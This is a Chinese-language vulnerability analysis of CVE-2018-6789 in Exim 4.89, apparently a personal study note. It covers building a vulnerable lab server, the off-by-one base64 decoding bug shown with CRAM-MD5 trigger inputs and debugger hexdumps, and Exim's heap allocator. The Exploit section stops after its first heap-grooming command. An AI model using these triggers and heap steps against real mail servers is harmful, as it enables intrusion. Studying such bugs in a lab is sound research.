# CVE-2018-6789

## 环境搭建
安装依赖
````shell
apt-get install gcc net-tools vim gdb python wget git make procps libpcre3-dev libdb-dev libxt-dev libxaw7-dev
````
下载旧版本的exim
```shell
wget ftp://mirror.easyname.at/exim-ftp/exim/exim4/old/exim-4.89.tar.gz
tar -xvzf ./exim-4.89.tar.gz
cd ./exim-4.89
cp src/EDITME Local/Makefile
cp exim_monitor/EDITME Local/eximon.conf
````
然后修改Local/Makefile
为了方便其中各个文件夹都指向当前目录下
````shell
BIN_DIRECTORY=/home/zzx/EVA/cve-2018-6789/exim-4.89/bin
CONFIGURE_FILE=/home/zzx/EVA/cve-2018-6789/exim-4.89/configure
SPOOL_DIRECTORY=/home/zzx/EVA/cve-2018-6789/exim-4.89/exim
EXIM_USER=zzx
AUTH_PLAINTEXT=yes
AUTH_CRAM_MD5=yes
AUTH_TLS=yes
````
这样便于调试
然后编译安装
````shell
make install
````
修改./configure, 直接用下面内容覆盖
````shell
acl_smtp_mail=acl_check_mail
acl_smtp_data=acl_check_data
begin acl
acl_check_mail:
  .ifdef CHECK_MAIL_HELO_ISSUED
  deny
    message = no HELO given before MAIL command
    condition = ${if def:sender_helo_name {no}{yes}}
  .endif

  accept

acl_check_data:
  accept

begin authenticators
fixed_cram:
  driver = cram_md5
  public_name = CRAM-MD5
  server_secret = ${if eq{$auth1}{ph10}{secret}fail}
  server_set_id = $auth1
````

## 运行
````shell
./bin/exim -bd -d-receive
````
## 漏洞分析
首先先分析位于base64.c中的patch:
![1](images/1.png)
其中result是base64解码结果存放的buffer，由store_get函数获取
可以发现patch之前的size计算是有问题的，当size属于4n~4n+3的范围里面的时候，计算得到的size的长度是相等的，但是b64decode对于非4的倍数的参数进行解码的时候会多解出一两个字节

比如我们直接发送
```python
auth_md5('Hf'*42)
```
size=0x40\
结果的内存分布:
```shell
pwndbg> hexdump 0x711d60 0x50
+0000 0x711d60  1d f1 df 1d  f1 df 1d f1  df 1d f1 df  1d f1 df 1d  │....│....│....│....│
+0010 0x711d70  f1 df 1d f1  df 1d f1 df  1d f1 df 1d  f1 df 1d f1  │....│....│....│....│
+0020 0x711d80  df 1d f1 df  1d f1 df 1d  f1 df 1d f1  df 1d f1 df  │....│....│....│....│
+0030 0x711d90  1d f1 df 1d  f1 df 1d f1  df 1d f1 df  1d f1 df 00  │....│....│....│....│
+0040 0x711da0  20 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │.aaa│aaaa│aaaa│aaaa│
```

再试试
```python
auth_md5('Hf'*42+'HfH')
```
size=0x40
```shell
pwndbg> hexdump 0x711d60 0x50
+0000 0x711d60  1d f1 df 1d  f1 df 1d f1  df 1d f1 df  1d f1 df 1d  │....│....│....│....│
+0010 0x711d70  f1 df 1d f1  df 1d f1 df  1d f1 df 1d  f1 df 1d f1  │....│....│....│....│
+0020 0x711d80  df 1d f1 df  1d f1 df 1d  f1 df 1d f1  df 1d f1 df  │....│....│....│....│
+0030 0x711d90  1d f1 df 1d  f1 df 1d f1  df 1d f1 df  1d f1 df 1d  │....│....│....│....│
+0040 0x711da0  f1 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │.aaa│aaaa│aaaa│aaaa│
```
溢出了两个字节

## Exim内存管理机制
exim为了提升性能在原有的堆管理机制上自己实现了一套内存管理机制，它相当于处于代码和glibc之间的一个中间缓冲，目的是减少malloc和free的次数
![2](images/2.png)
对于exim来说一个单独的堆块称为storeblock，每次使用时从里面分割出合适大小的缓冲区使用，如果一个storeblock用完了就再malloc一个storeblock。
对于每个storeblock来说，它的结构是一个简单的单链表：
```c
/* Structure describing the beginning of each big block. */
typedef struct storeblock {
  struct storeblock *next;
  size_t length;
} storeblock;
```
程序使用堆的时候主要使用的api在store.c中：
```c
store_get
store_release
store_extend
store_reset
```
其中store_get用于获取缓冲区，关键代码如下：
```c
void *store_get_3(int size, const char *filename, int linenumber)
{
  int length = (size <= STORE_BLOCK_SIZE)? STORE_BLOCK_SIZE : size;
  ...
  /* If there was no free block, get a new one */
  if (!newblock){
    ...
    newblock = store_malloc(mlength);]
    ...
  }
  ...
}
```
可以看到每次申请的store_block最小长度为STORE_BLOCK_SIZE, 即8192

所以一个8192大小的store_block，加上它的结构头部以及堆块头部后总大小为0x2020
![3](images/3.png)

## Exploit
我的exp也是按照网上别人的分析一步一步得到的，大体思路不变，不过堆的布局和别人有些不一样，所有有些小的参数是不同的



首先先生成一个大小为0x6060的unsortedbin，只需要如下指令就能实现
```python
ehlo('a'*0x1000)
```
这里的运行逻辑是
## Reference
https://medium.com/@straightblast426/my-poc-walk-through-for-cve-2018-6789-2e402e4ff588
https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789
